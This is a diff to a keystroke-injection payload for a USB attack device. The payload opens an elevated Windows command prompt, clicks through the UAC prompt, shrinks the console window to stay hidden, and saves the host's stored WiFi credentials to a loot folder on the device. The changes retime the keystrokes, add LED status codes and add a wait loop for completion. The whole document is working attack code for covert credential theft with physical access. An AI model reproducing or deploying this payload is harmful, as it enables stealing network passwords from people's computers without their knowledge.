@@ -8,25 +8,23 @@
 # then stashes them in /root/udisk/loot/WiFiCreds
 #
 # Blue...............Running Script
-# Purple.............Got WiFi Creds
+# Purple.............Getting WiFi Creds
+# Green..............Got WiFi Creds :)
+# Red................No WiFi Creds :(
 
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
-
-LED R 200
 LOOTDIR=/root/udisk/loot/WiFiCreds
 mkdir -p $LOOTDIR
 
 ATTACKMODE HID STORAGE
 LED B 200
+Q DELAY 1000
 Q GUI
-Q DELAY 100
+Q DELAY 200
 Q STRING CMD
 Q DELAY 400
 Q CTRL-SHIFT ENTER
-Q DELAY 2500
+Q DELAY 2000
 Q LEFTARROW
-Q DELAY 100
 Q ENTER
 Q DELAY 1000
 Q STRING mode con:cols=18 lines=1
@@ -44,12 +42,20 @@ Q ENTER
 Q DELAY 100
 Q STRING EXIT
 Q ENTER
-Q DELAY 10000
+Q DELAY 100
 sync
 
+while ! test -f "$LOOTDIR/DONE"; do
+  sleep 1
+  LED R B 200
+done
+
+#sleep for 10 seconds because they may have alot of stored connections to parse
+sleep 10;
+
 if [ -f "$LOOTDIR/DONE"  ]; then
-   rm "$LOOTDIR/DONE"
-   LED R B 200
+   rm $LOOTDIR/DONE
+   LED G 200
 else
    LED R
 fi
